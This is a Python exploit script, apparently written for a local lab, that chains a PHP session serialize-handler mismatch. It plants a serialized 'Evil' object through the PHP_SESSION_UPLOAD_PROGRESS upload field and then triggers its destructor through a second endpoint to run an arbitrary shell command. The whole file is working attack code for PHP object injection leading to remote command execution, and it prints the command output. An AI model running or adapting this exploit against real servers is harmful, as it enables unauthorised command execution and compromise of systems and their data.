#!/usr/bin/env python3
"""Session serialize-handler mismatch chain (CVE-2026-109619 family).

Write side: /chainW (session.serialize_handler=php_serialize) stores the raw
PHP_SESSION_UPLOAD_PROGRESS field value inside the session file.
Read side:  /chainR (session.serialize_handler=php) splits at the first '|'
inside that string and unserializes the remainder as an Evil object, then
fails on the trailing data and destroys the object, firing __destruct.

Usage: chain_c.py <port> [cmd]
"""
import socket
import sys

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
cmd = sys.argv[2] if len(sys.argv) > 2 else "id"

sid = "chainc" + "".join("%02x" % b for b in __import__("os").urandom(10))

payload = f'x|O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'
boundary = b"----chainC"
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    + payload.encode() + b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
    b"--" + boundary + b"--\r\n"
)

def send(req):
    s = socket.create_connection(("127.0.0.1", port), timeout=30)
    s.sendall(req)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data

w = (
    b"POST /chainW/up.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
) + body
print("[1] write:", send(w).split(b"\r\n", 1)[0].decode("latin-1"))

r = (
    b"GET /chainR/read.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
)
resp = send(r)
head, _, out = resp.partition(b"\r\n\r\n")
print("[2] read:", head.split(b"\r\n", 1)[0].decode("latin-1"))
print(out.decode("latin-1", "replace"))
